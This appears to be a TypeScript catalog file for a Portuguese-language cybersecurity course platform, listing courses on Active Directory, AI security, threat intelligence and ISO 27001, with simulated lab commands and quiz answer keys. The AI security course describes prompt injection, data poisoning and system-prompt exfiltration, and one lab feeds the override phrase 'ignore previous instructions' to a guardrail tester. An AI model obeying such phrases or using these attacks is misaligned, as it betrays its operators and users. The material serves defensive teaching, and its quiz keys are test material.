      { title: "Privilégios e contenção", description: "Mapeie caminhos de administração e contenha usuário suspeito.", objective: "Usar BloodHound e SIEM para identificar admin path e executar contenção.", command: "bloodhound query shortest-path --from mari.soc --to \"Domain Admins\" && siem correlate identity_abuse", output: "Path: mari.soc → SOC-Analysts → Admins-Group → Domain Admins\nHops: 3\nRisco: elevação possível via group membership\nAção: contain user mari.soc reason=\"suspected token abuse\"" },
    ],
    assessment: "Avaliação de AD, Kerberos, NTLM, privilégios, cloud identity e detecção de abuso.",
    assessmentQuestions: [
      { id: "id-1", prompt: "O SID em Active Directory serve para:", options: ["Identificar de forma única usuários, grupos e computadores no domínio", "Criptografar senhas de usuário", "Definir a política de senhas do domínio", "Gerenciar licenças de software"], correctAnswer: 0, explanation: "SID é o identificador de segurança único atribuído a cada principal no domínio." },
      { id: "id-2", prompt: "No Kerberos, o TGT (Ticket Granting Ticket) é:", options: ["O ticket inicial usado para obter tickets de serviço sem reautenticar", "O ticket final que permite acesso ao servidor de aplicação", "Um token OAuth para APIs cloud", "O certificado digital do usuário"], correctAnswer: 0, explanation: "TGT é obtido do KDC e usado para solicitar TGS sem enviar credenciais novamente." },
      { id: "id-3", prompt: "NTLM relay attack explora:", options: ["Reutilização de autenticação NTLM entre serviços para elevar privilégio", "Falha no protocolo Kerberos", "Senha fraca do administrador", "Configuração incorreta de firewall"], correctAnswer: 0, explanation: "Attacker intercepta e reutiliza autenticação NTLM para acessar recursos como a vítima." },
      { id: "id-4", prompt: "BloodHound é usado para:", options: ["Mapear caminhos de administração e privilégios em AD graficamente", "Bloquear ataques de brute force em tempo real", "Criptografar o banco de dados AD", "Gerar relatórios de compliance ISO"], correctAnswer: 0, explanation: "BloodHound analisa relações de AD para identificar caminhos de elevação de privilégio." },
      { id: "id-5", prompt: "OAuth consent grant abuse ocorre quando:", options: ["Usuário autoriza aplicação maliciosa a acessar dados sem revisão adequada", "O token OAuth expira antes do uso", "O MFA é desativado pelo administrador", "O SSO falha na federação de identidade"], correctAnswer: 0, explanation: "Consent phishing leva usuário a autorizar app malicioso com escopo excessivo." },
      { id: "id-6", prompt: "Evento SIEM 4624 com logon type 3 indica:", options: ["Logon de rede (acesso remoto via SMB/RDP/WinRM)", "Logon interativo no console local", "Logon de serviço do sistema", "Logon batch agendado"], correctAnswer: 0, explanation: "Logon type 3 = network logon, comum em acesso remoto e deve ser correlacionado com contexto." },
    ],
  },
  {
    slug: "ia-security-avancado", code: "AI-SEC-02", title: "Segurança de Inteligência Artificial — Do Modelo Ingênuo à Aplicação Blindada", shortTitle: "IA Security Avançado", level: "Avançado", duration: "16 horas", lessons: 6, labs: 3, quizCount: 6, accent: "green", icon: "cpu",
    description: "Prompt injection, data poisoning, model extraction, segurança de APIs, RAG, defesa LLM e governança com OWASP LLM Top 10 2025 e NIST AI RMF.", focus: "Defender aplicações com LLM contra ataques modernos de IA com método e rigor técnico.",
    outcomes: ["Identificar e mitigar prompt injection direta e indireta em aplicações LLM.", "Reconhecer riscos de data poisoning e supply chain em modelos de ML.", "Avaliar segurança de APIs de IA: autenticação, rate limiting, exfiltração.", "Aplicar OWASP LLM Top 10 2025 e NIST AI RMF para governança de IA."],
    modules: [
      { title: "Fundamentos de IA e Superfície de Ataque", lessons: 1, description: "Como LLMs funcionam, janela de contexto e superfície de ataque." },
      { title: "Prompt Injection — O Ataque Mais Subestimado", lessons: 1, description: "Injeção direta, indireta, jailbreaks e bypasses de filtros." },
      { title: "Data Poisoning e Supply Chain de ML", lessons: 1, description: "Envenenamento de datasets, backdoors e ataques à cadeia de fornecimento." },
      { title: "Model Extraction e Evasion", lessons: 1, description: "Roubo de modelos via API, ataques adversariais e evasão de classificadores." },
      { title: "Segurança em APIs de IA", lessons: 1, description: "Autenticação, rate limiting, exfiltração de system prompt e RAG." },
      { title: "Defesa: AI Security + LLM Hardening", lessons: 1, description: "Guardrails, output sanitization, threat modeling e governança." },
    ],
    labsList: [
      { title: "Identificar componentes de risco em arquitetura LLM", description: "Analise arquitetura de aplicação com LLM e identifique maior risco imediato.", objective: "Mapear superfície de ataque de stack com LLM, RAG e ferramentas conectadas.", command: "analisar-arquitetura --app supportbot-pro --componentes rag,crm,zendesk", output: "Componentes: 6\nMaior risco: RAG com PDFs externos + CRM multi-cliente sem isolamento\nRecomendação: sandbox de retrieval, isolamento de dados por cliente" },
      { title: "Testar guardrails e output sanitization", description: "Valide filtros de saída e guardrails de uma aplicação LLM simulada.", objective: "Verificar se output sanitization previne vazamento de dados sensíveis.", command: "testar-guardrails --input 'ignore previous instructions' --output-filter enabled", output: "Input testado: injection attempt\nOutput: filtrado corretamente\nGuardrail: ativo\nScore: 8/10 — recomendação: adicionar filtro de contexto" },
      { title: "Threat modeling para aplicação RAG", description: "Modele ameaças para sistema RAG com documentos externos e ferramentas.", objective: "Aplicar threat modeling específico para IA com vetores de injection via retrieval.", command: "threat-model --system rag-app --framework owasp-llm-top10-2025", output: "LLM01 Prompt Injection: ALTO (via documentos RAG)\nLLM02 Sensitive Info Disclosure: ALTO (dados multi-cliente)\nLLM06 Excessive Agency: MÉDIO (ferramentas conectadas)\nMitigações propostas: 4" },
    ],
    assessment: "Avaliação de prompt injection, data poisoning, model extraction, APIs e defesa LLM.",
    assessmentQuestions: [
      { id: "ia2-1", prompt: "Prompt injection indireta ocorre quando:", options: ["O atacante injeta instruções via dados que o modelo processa (documentos, e-mails, resultados)", "O usuário digita comando malicioso no terminal", "O modelo gera resposta incorreta por alucinação", "A API key é exposta em logs"], correctAnswer: 0, explanation: "Injection indireta usa dados de entrada não confiáveis que o modelo processa como contexto." },
      { id: "ia2-2", prompt: "Data poisoning em ML significa:", options: ["Manipulação do dataset de treino para alterar comportamento do modelo", "Corrupção de dados em banco SQL", "Injeção de SQL via formulário", "Ataque de negação de serviço ao modelo"], correctAnswer: 0, explanation: "Poisoning altera dados de treino para introduzir backdoor ou viés no modelo treinado." },
      { id: "ia2-3", prompt: "OWASP LLM01:2025 refere-se a:", options: ["Prompt Injection — injeção de instruções maliciosas no modelo", "Sensitive Information Disclosure", "Supply Chain Vulnerabilities", "Data and Model Poisoning"], correctAnswer: 0, explanation: "LLM01 é a vulnerabilidade mais crítica no OWASP Top 10 for LLM Applications 2025." },
      { id: "ia2-4", prompt: "Exfiltração de system prompt é um risco porque:", options: ["Revela instruções internas que podem ser usadas para bypass de segurança", "Causa lentidão na API", "Aumenta o custo de tokens", "Melhora a qualidade das respostas"], correctAnswer: 0, explanation: "System prompt contém regras de negócio e restrições; sua exposição facilita ataques direcionados." },
      { id: "ia2-5", prompt: "RAG (Retrieval-Augmented Generation) introduz risco de:", options: ["Prompt injection via documentos maliciosos no retrieval", "Aumento exponencial do custo de inferência", "Impossibilidade de fine-tuning", "Redução da qualidade de embeddings"], correctAnswer: 0, explanation: "Documentos no retrieval podem conter instruções que o modelo segue como contexto legítimo." },
      { id: "ia2-6", prompt: "Output sanitization em aplicações LLM serve para:", options: ["Filtrar informações sensíveis antes de exibir ao usuário", "Acelerar a geração de texto", "Comprimir o output para reduzir tokens", "Traduzir a resposta para múltiplos idiomas"], correctAnswer: 0, explanation: "Sanitization previne vazamento de dados sensíveis ou instruções internas no output do modelo." },
    ],
  },
  {
    slug: "cti-apostila", code: "CTI-02", title: "Guia Interativo de Inteligência de Ameaças Cibernéticas", shortTitle: "CTI Avançado", level: "Avançado", duration: "20 horas", lessons: 17, labs: 2, quizCount: 6, accent: "green", icon: "network",
    description: "17 partes temáticas: ciclo de inteligência, julgamento analítico, camadas, compartilhamento STIX/TAXII/MISP, hunting, SOC orientado por CTI, resposta a incidentes, gestão de riscos, atribuição e maturidade.", focus: "Operar inteligência de ameaças em SOC, Hunting e IR com rigor analítico e evidência.",
    outcomes: ["Distinguir dado, informação e inteligência no ciclo de CTI.", "Aplicar julgamento analítico com avaliação de confiabilidade e credibilidade.", "Operar compartilhamento via STIX, TAXII, MISP e TIPs.", "Integrar CTI em SOC, hunting, resposta a incidentes e gestão de riscos."],
    modules: [
      { title: "Contexto e ciclo de inteligência", lessons: 3, description: "O que é CTI, por que investir e o ciclo de vida da inteligência." },
      { title: "Base de conhecimento e relatórios", lessons: 3, description: "Estruturar base, produzir relatórios e julgar com credibilidade." },
      { title: "Julgamento analítico e viés", lessons: 3, description: "Confiabilidade, credibilidade, probabilidade e erro analítico." },
      { title: "Camadas e compartilhamento", lessons: 3, description: "Camadas de intelligence, STIX, TAXII, MISP e TIPs." },
      { title: "Operações: Hunting e SOC", lessons: 3, description: "Threat hunting, SOC orientado por CTI e resposta a incidentes." },
      { title: "Risco, atribuição e maturidade", lessons: 2, description: "Gestão de riscos, atribuição de adversários e maturidade do programa." },
    ],
    labsList: [
      { title: "Classificação de IOCs por relevância", description: "Classifique indicadores de comprometimento por relevância ao ambiente.", objective: "Distinguir dado bruto de inteligência acionável com contexto de negócio.", command: "classificar-iocs --lista iocs-feed.txt --contexto setor-saude", output: "IOCs analisados: 50\nRelevantes ao contexto: 12\nAção recomendada: bloquear 8, monitorar 4\nInteligência: grupo APT29 ativo no setor" },
      { title: "Relatório CTI para decisão executiva", description: "Produza relatório CTI com julgamento analítico e recomendações.", objective: "Comunicar risco de ameaça em linguagem de negócio com evidência e confiança.", command: "gerar-relatorio --tema apt-sector --audiencia diretoria", output: "Resumo executivo: grupo APT29 intensifica campanhas no setor\nConfiança: ALTA (fontes múltiplas corroboradas)\nRecomendação: aplicar controles do relatório técnico\nPrazo: 7 dias para mitigação crítica" },
    ],
    assessment: "Avaliação de ciclo de inteligência, julgamento analítico, compartilhamento e operações CTI.",
    assessmentQuestions: [
      { id: "cti-1", prompt: "A diferença entre dado e inteligência é:", options: ["Inteligência é dado processado com contexto, relevância e recomendação de ação", "Não existe diferença; são sinônimos", "Dado é mais valioso que inteligência", "Inteligência é sempre classificada como secreta"], correctAnswer: 0, explanation: "Inteligência transforma dado bruto em conhecimento acionável com contexto e recomendação." },
      { id: "cti-2", prompt: "O ciclo de inteligência inclui as etapas:", options: ["Direção, coleta, processamento, análise, disseminação e feedback", "Apenas coleta e análise", "Coleta, armazenamento e arquivamento", "Análise, publicação e marketing"], correctAnswer: 0, explanation: "Ciclo completo garante que inteligência atenda requisitos e seja retroalimentada." },
      { id: "cti-3", prompt: "STIX e TAXII são usados para:", options: ["Padronizar representação e compartilhamento de indicadores de ameaça", "Criptografar comunicações entre SOC e IR", "Gerenciar senhas de administradores", "Monitorar tráfego de rede em tempo real"], correctAnswer: 0, explanation: "STIX define formato de dados; TAXII define protocolo de compartilhamento de CTI." },
      { id: "cti-4", prompt: "MISP (Malware Information Sharing Platform) é:", options: ["Plataforma open source para compartilhar e correlacionar IOCs entre organizações", "Um antivírus comercial para endpoints", "Um firewall de próxima geração", "Um sistema de backup de logs"], correctAnswer: 0, explanation: "MISP permite compartilhamento estruturado de inteligência entre comunidades de segurança." },
      { id: "cti-5", prompt: "Julgamento analítico com escala de confiança usa:", options: ["Avaliação de confiabilidade da fonte e credibilidade da informação", "Apenas opinião do analista sênior", "Número de IOCs no feed", "Velocidade de resposta do SIEM"], correctAnswer: 0, explanation: "Escala NATO (A-F para fonte, 1-6 para informação) padroniza avaliação de confiança." },
      { id: "cti-6", prompt: "SOC orientado por CTI é mais efetivo porque:", options: ["Prioriza alertas com base em ameaças reais ao ambiente, não em regras genéricas", "Elimina a necessidade de analistas humanos", "Reduz o custo de ferramentas de segurança", "Substitui o SIEM por plataforma de inteligência"], correctAnswer: 0, explanation: "CTI contextualiza alertas com TTPs de adversários relevantes, melhorando triagem e resposta." },
    ],
  },
  {
    slug: "iso-27001-sem-ilusao", code: "ISO-02", title: "ISO 27001 Sem Ilusão — SGSI, Risco e Controles", shortTitle: "ISO 27001 Prático", level: "Intermediário", duration: "18 horas", lessons: 9, labs: 3, quizCount: 6, accent: "green", icon: "shield",
    description: "SGSI sem fantasia, contexto e escopo, risco sem fanfic, controles do Anexo A, evidências e auditoria, incidentes e continuidade, fornecedores, cloud e IA, SoA e aplicabilidade.", focus: "Aplicar ISO 27001 com rigor técnico em cenários modernos incluindo cloud e IA.",
    outcomes: ["Definir escopo de SGSI alinhado ao contexto organizacional.", "Realizar análise de risco com metodologia estruturada e evidências.", "Mapear controles do Anexo A (93 controles, 4 grupos) ao cenário real.", "Produzir SoA (Statement of Applicability) com justificativas técnicas."],
    modules: [
      { title: "SGSI sem fantasia", lessons: 1, description: "Sistema de gestão, requisitos e diferença entre norma e implementação." },
      { title: "Contexto e escopo", lessons: 1, description: "Partes interessadas, limites do SGSI e exclusões justificadas." },
      { title: "Risco sem fanfic", lessons: 1, description: "Identificação, análise, avaliação e tratamento de riscos de segurança." },
      { title: "Controles do Anexo A", lessons: 1, description: "93 controles em 4 grupos: organizacional, pessoas, físico e tecnológico." },
      { title: "Evidências e auditoria", lessons: 1, description: "Registros, auditoria interna, não conformidades e melhoria." },
      { title: "Fornecedores, cloud e IA + SoA", lessons: 1, description: "Gestão de terceiros, riscos de cloud/IA e Statement of Applicability." },
    ],
    labsList: [
      { title: "Definição de escopo SGSI", description: "Defina escopo de SGSI para organização fictícia com múltiplos sites.", objective: "Delimitar boundaries do SGSI com justificativa técnica e exclusões documentadas.", command: "definir-escopo --org cyberdim-academy --sites 3 --exclusoes desenvolvimento-offshore", output: "Escopo: operações de segurança, SOC, GRC\nSites incluídos: 3\nExclusões: desenvolvimento offshore (justificado)\nPartes interessadas: 12 mapeadas" },
      { title: "Análise de risco com matriz", description: "Avalie riscos de segurança com probabilidade, impacto e tratamento.", objective: "Aplicar metodologia de risco para priorizar tratamento com evidências.", command: "analisar-risco --matriz 5x5 --riscos risks-input.json", output: "Riscos avaliados: 15\nCríticos: 3 (vazamento de dados, ransomware, acesso não autorizado)\nTratamento: mitigar 10, transferir 2, aceitar 3\nPlano de ação: 90 dias para críticos" },
      { title: "Mapeamento de controles Anexo A", description: "Mapeie controles do Anexo A 2022 ao cenário organizacional.", objective: "Relacionar 93 controles aos riscos identificados com status de implementação.", command: "mapear-controles --anexo A:2022 --riscos risks-output.json", output: "Controles aplicáveis: 67 de 93\nImplementados: 45\nEm implementação: 12\nNão aplicáveis: 26 (justificados no SoA)" },
    ],
    assessment: "Avaliação de SGSI, escopo, risco, controles Anexo A, auditoria, fornecedores e SoA.",
    assessmentQuestions: [
      { id: "iso2-1", prompt: "O escopo do SGSI deve ser:", options: ["Delimitado com justificativa técnica e exclusões documentadas", "O mais amplo possível para cobrir tudo", "Definido apenas pelo auditor externo", "Ignorado na fase de implementação"], correctAnswer: 0, explanation: "Escopo claro define boundaries e permite exclusões justificadas para foco adequado." },
      { id: "iso2-2", prompt: "O Anexo A da ISO 27001:2022 possui:", options: ["93 controles organizados em 4 grupos", "114 controles em 14 domínios", "50 controles em 2 grupos", "200 controles sem agrupamento"], correctAnswer: 0, explanation: "Versão 2022 consolida controles em 4 grupos: organizacional, pessoas, físico e tecnológico." },
      { id: "iso2-3", prompt: "O SoA (Statement of Applicability) documenta:", options: ["Quais controles são aplicáveis, implementados e justificativas para exclusões", "Apenas os controles implementados", "O orçamento de segurança anual", "A lista de funcionários com acesso administrativo"], correctAnswer: 0, explanation: "SoA é requisito da norma: declara aplicabilidade de cada controle com justificativa." },
      { id: "iso2-4", prompt: "Tratamento de risco pode incluir:", options: ["Mitigar, transferir, evitar ou aceitar o risco com justificativa", "Apenas mitigar todos os riscos", "Ignorar riscos de baixa probabilidade sem registro", "Transferir todos os riscos para seguros"], correctAnswer: 0, explanation: "ISO 27001 permite quatro opções de tratamento com decisão documentada e justificada." },
      { id: "iso2-5", prompt: "Auditoria interna do SGSI serve para:", options: ["Verificar conformidade com requisitos da norma antes da auditoria externa", "Substituir a auditoria de certificação", "Punir funcionários por não conformidades", "Reduzir o número de controles implementados"], correctAnswer: 0, explanation: "Auditoria interna identifica não conformidades e oportunidades de melhoria antes da certificação." },
      { id: "iso2-6", prompt: "Riscos de IA no contexto ISO 27001 devem ser tratados com:", options: ["Controles específicos para dados de treino, modelo e output, além de governança", "Apenas controles de acesso físico", "Ignorando porque a norma não menciona IA", "Terceirizando toda a responsabilidade"], correctAnswer: 0, explanation: "ISO 27001:2022 e complementos (como ISO 42001) abordam riscos emergentes incluindo IA." },
    ],
  },
] as const satisfies readonly ActivatedCatalogCourse[];

export const activatedCatalogCourseSlugs = activatedCatalogCourses.map((course) => course.slug) as [string, ...string[]];

export function getActivatedCatalogCourse(slug: string) {
  return activatedCatalogCourses.find((course) => course.slug === slug);
}
